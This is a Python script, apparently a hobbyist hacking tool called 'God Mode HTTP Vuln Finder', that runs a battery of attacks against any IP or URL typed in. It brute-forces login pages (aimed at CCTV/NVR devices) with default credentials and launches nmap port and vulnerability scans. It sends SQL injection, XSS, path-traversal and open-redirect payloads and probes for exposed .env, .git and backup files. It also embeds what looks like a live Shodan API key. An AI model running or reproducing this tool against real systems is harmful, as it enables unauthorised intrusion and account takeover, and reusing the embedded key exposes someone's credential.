#!/usr/bin/env python3

import requests
import subprocess
import re
import time
from urllib.parse import urlparse
import sys
import socket
import json
import threading

# Common brute-force credentials
usernames = ['admin', 'root', 'user']
passwords = ['admin', '1234', '12345', '123456', 'password', 'root']

# Login paths often seen in CCTV/NVRs
login_paths = [
    '/login', '/admin', '/admin/login', '/user/login',
    '/dvr/login', '/cgi-bin/login.cgi'
]

def normalize_url(ip_or_url):
    if not ip_or_url.startswith("http"):
        return "http://" + ip_or_url
    return ip_or_url

def extract_domain(target):
    parsed = urlparse(target)
    return parsed.netloc

def port_scan(domain):
    print(f"\n[🔍] Scanning open ports on {domain} with nmap...")
    subprocess.run(["nmap", "-Pn", "-sS", "-T4", "-p-", domain])

def vuln_scan(domain):
    print(f"\n[⚠️] Scanning HTTP vulns with nmap scripts...")
    subprocess.run(["nmap", "-p", "80,443", "--script", "http-vuln*", "-Pn", domain])

def dirb_scan(url):
    print(f"\n[🗂️] Running dirb on {url}...")
    subprocess.run(["dirb", url, "/usr/share/dirb/wordlists/common.txt"])

def sql_injection_test(url):
    print(f"\n[🧪] Basic SQLi test on {url}...")
    try:
        payload = "' OR '1'='1"
        r = requests.get(url + "?id=" + payload, timeout=5)
        if "mysql" in r.text.lower() or "syntax" in r.text.lower() or "sql" in r.text.lower():
            print("⚠️  Possible SQL Injection vulnerability!")
        else:
            print("✅ No SQL errors detected")
    except Exception as e:
        print(f"[!] Error: {e}")

def login_bruteforce(url):
    print(f"\n[🔐] Attempting login brute-force on {url}...")
    for path in login_paths:
        full_url = url + path
        for user in usernames:
            for pwd in passwords:
                try:
                    r = requests.post(full_url, data={'username': user, 'password': pwd}, timeout=5)
                    if r.status_code == 200 and "invalid" not in r.text.lower() and "incorrect" not in r.text.lower():
                        print(f"[✅] Login success: {full_url} | {user}:{pwd}")
                        return
                except:
                    pass
    print("❌ No valid login found.")

def banner():
    print("""
    ██████╗  ██████╗  ██████╗ ███╗   ███╗ ██████╗  ██████╗ ███████╗
    ██╔══██╗██╔═══██╗██╔═══██╗████╗ ████║██╔═══██╗██╔════╝ ██╔════╝
    ██████╔╝██║   ██║██║   ██║██╔████╔██║██║   ██║██║  ███╗█████╗  
    ██╔═══╝ ██║   ██║██║   ██║██║╚██╔╝██║██║   ██║██║   ██║██╔══╝  
    ██║     ╚██████╔╝╚██████╔╝██║ ╚═╝ ██║╚██████╔╝╚██████╔╝███████╗
    ╚═╝      ╚═════╝  ╚═════╝ ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝
    God Mode HTTP Vuln Finder | by Kaecilius404
    """)

def http_headers_info(url):
    print(f"\n[ℹ️ ] HTTP Headers and Tech Fingerprinting for {url}")
    try:
        r = requests.get(url, timeout=5)
        for k, v in r.headers.items():
            print(f"  {k}: {v}")
        server = r.headers.get('Server', 'Unknown')
        powered = r.headers.get('X-Powered-By', 'Unknown')
        print(f"  [Tech] Server: {server}, X-Powered-By: {powered}")
    except Exception as e:
        print(f"  [!] Error: {e}")

def robots_txt_check(url):
    robots_url = url.rstrip('/') + '/robots.txt'
    print(f"\n[🤖] Checking for robots.txt at {robots_url}")
    try:
        r = requests.get(robots_url, timeout=5)
        if r.status_code == 200:
            print("[+] robots.txt found!")
            print(r.text[:500] + ("..." if len(r.text) > 500 else ""))
        else:
            print("[-] robots.txt not found.")
    except Exception as e:
        print(f"[!] Error: {e}")

def env_file_check(url):
    env_url = url.rstrip('/') + '/.env'
    print(f"\n[🔎] Checking for exposed .env file at {env_url}")
    try:
        r = requests.get(env_url, timeout=5)
        if r.status_code == 200 and "DB_" in r.text:
            print("[!] .env file exposed!")
            print(r.text[:500] + ("..." if len(r.text) > 500 else ""))
        else:
            print("[-] .env file not found or not exposed.")
    except Exception as e:
        print(f"[!] Error: {e}")

def xss_test(url):
    print(f"\n[🧪] Testing for basic reflected XSS on {url}")
    payload = "<script>alert(1337)</script>"
    try:
        r = requests.get(url, params={"q": payload}, timeout=5)
        if payload in r.text:
            print("[!] Possible XSS vulnerability (payload reflected)!")
        else:
            print("[+] No reflected XSS detected.")
    except Exception as e:
        print(f"[!] Error: {e}")

def lfi_test(url):
    print(f"\n[🧪] Testing for basic LFI on {url}")
    payloads = ["../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini"]
    for p in payloads:
        try:
            r = requests.get(url, params={"file": p}, timeout=5)
            if "root:x:" in r.text or "[extensions]" in r.text:
                print(f"[!] Possible LFI with payload: {p}")
        except Exception:
            pass

def http_methods_check(url):
    print(f"\n[🔧] Checking allowed HTTP methods for {url}")
    try:
        r = requests.options(url, timeout=5)
        allow = r.headers.get('Allow', '')
        if allow:
            print(f"[+] Allowed methods: {allow}")
        else:
            print("[-] Could not determine allowed methods.")
    except Exception as e:
        print(f"[!] Error: {e}")

def screenshot(url):
    print(f"\n[📸] Attempting to take screenshot of {url} (requires cutycapt or webkit2png)...")
    try:
        # Try cutycapt
        subprocess.run(["cutycapt", "--url=" + url, "--out=screenshot.png"])
        print("[+] Screenshot saved as screenshot.png")
    except Exception:
        try:
            # Try webkit2png
            subprocess.run(["webkit2png", url])
            print("[+] Screenshot attempted with webkit2png.")
        except Exception:
            print("[-] Screenshot tools not found.")

def shodan_lookup(ip):
    SHODAN_API_KEY = "Ln5q6vO46oxtRQ66tWez8txIVEDvKwAW"  # <-- Put your API key here if you have one
    if not SHODAN_API_KEY:
        print("\n[🔍] Skipping Shodan lookup (no API key set).")
        return
    print(f"\n[🔍] Looking up {ip} on Shodan...")
    try:
        r = requests.get(f"https://api.shodan.io/shodan/host/{ip}?key={SHODAN_API_KEY}", timeout=8)
        if r.status_code == 200:
            data = r.json()
            print(f"[+] Shodan Data: {data}")
        else:
            print("[-] Not found on Shodan or error.")
    except Exception as e:
        print(f"[!] Error: {e}")

def subdomain_enum(domain):
    print(f"\n[🌐] Subdomain enumeration for {domain}")
    wordlist = ['www', 'admin', 'mail', 'test', 'dev', 'api', 'vpn', 'portal', 'webmail']
    found = []
    for sub in wordlist:
        subdomain = f"{sub}.{domain}"
        try:
            socket.gethostbyname(subdomain)
            print(f"[+] Found: {subdomain}")
            found.append(subdomain)
        except:
            pass
    if not found:
        print("[-] No common subdomains found.")

def waf_detect(url):
    print(f"\n[🛡️ ] WAF Detection for {url}")
    try:
        r = requests.get(url, timeout=5)
        waf_headers = ['Server', 'X-Sucuri-ID', 'X-CDN', 'X-Akamai', 'X-Firewall']
        detected = False
        for h in waf_headers:
            if h in r.headers:
                print(f"[!] Possible WAF header: {h}: {r.headers[h]}")
                detected = True
        if not detected:
            print("[+] No obvious WAF detected.")
    except Exception as e:
        print(f"[!] Error: {e}")

def cve_search(tech):
    print(f"\n[🔎] Searching CVEs for: {tech}")
    try:
        r = requests.get(f"https://cve.circl.lu/api/search/{tech}", timeout=8)
        if r.status_code == 200:
            data = r.json()
            for cve in data.get('results', [])[:3]:
                print(f"[CVE] {cve['id']}: {cve['summary']}")
        else:
            print("[-] No CVE info found.")
    except Exception as e:
        print(f"[!] Error: {e}")

def sensitive_files_check(url):
    print(f"\n[🔒] Checking for sensitive files...")
    files = ['/.git/config', '/.svn/entries', '/backup.zip', '/db.sql', '/config.php', '/.DS_Store']
    for f in files:
        try:
            r = requests.get(url.rstrip('/') + f, timeout=5)
            if r.status_code == 200 and len(r.text) > 20:
                print(f"[!] Sensitive file found: {url.rstrip('/') + f}")
        except Exception:
            pass

def js_file_extraction(url):
    print(f"\n[📄] Extracting JS files from {url}")
    try:
        r = requests.get(url, timeout=5)
        js_files = re.findall(r'<script[^>]+src=["\'](.*?)["\']', r.text, re.I)
        if js_files:
            for js in js_files:
                print(f"[JS] {js}")
        else:
            print("[-] No JS files found.")
    except Exception as e:
        print(f"[!] Error: {e}")

def cors_check(url):
    print(f"\n[🌍] Checking CORS policy for {url}")
    try:
        r = requests.options(url, timeout=5)
        acao = r.headers.get('Access-Control-Allow-Origin', '')
        if acao == '*':
            print("[!] CORS misconfiguration: Access-Control-Allow-Origin is '*'.")
        elif acao:
            print(f"[+] CORS header: {acao}")
        else:
            print("[-] No CORS header found.")
    except Exception as e:
        print(f"[!] Error: {e}")

def open_redirect_test(url):
    print(f"\n[↪️ ] Testing for open redirect on {url}")
    payload = "https://evil.com"
    try:
        r = requests.get(url, params={"next": payload}, allow_redirects=False, timeout=5)
        loc = r.headers.get('Location', '')
        if payload in loc:
            print("[!] Possible open redirect vulnerability!")
        else:
            print("[+] No open redirect detected.")
    except Exception as e:
        print(f"[!] Error: {e}")

def dir_fuzz(url):
    print(f"\n[🗂️] Directory fuzzing (mini wordlist)...")
    paths = ['admin', 'backup', 'test', 'old', 'dev', 'uploads', 'private', 'config']
    for p in paths:
        try:
            r = requests.get(url.rstrip('/') + '/' + p, timeout=5)
            if r.status_code == 200:
                print(f"[+] Found: {url.rstrip('/') + '/' + p}")
        except Exception:
            pass

def summary_report():
    print("\n[📊] Scan summary: Review above output for findings. For full automation, add logging/reporting as needed.")

def main():
    banner()
    target = input("Enter target IP or URL: ").strip()
    url = normalize_url(target)
    domain = extract_domain(url)

    print(f"\n🚀 Starting full scan on: {url}")

    subdomain_enum(domain)
    waf_detect(url)
    http_headers_info(url)
    robots_txt_check(url)
    env_file_check(url)
    http_methods_check(url)
    xss_test(url)
    lfi_test(url)
    login_bruteforce(url)
    port_scan(domain)
    vuln_scan(domain)
    dirb_scan(url)
    dir_fuzz(url)
    sql_injection_test(url)
    screenshot(url)
    shodan_lookup(domain)
    sensitive_files_check(url)
    js_file_extraction(url)
    cors_check(url)
    open_redirect_test(url)
    # Try CVE search for detected tech
    try:
        r = requests.get(url, timeout=5)
        techs = []
        if 'Server' in r.headers:
            techs.append(r.headers['Server'].split('/')[0])
        if 'X-Powered-By' in r.headers:
            techs.append(r.headers['X-Powered-By'].split('/')[0])
        for t in set(techs):
            if t and t != 'Unknown':
                cve_search(t)
    except Exception:
        pass

    summary_report()
    print("\n✅ Scan complete. God Mode HTTP Vuln Finder finished.")

if __name__ == "__main__":
    main()
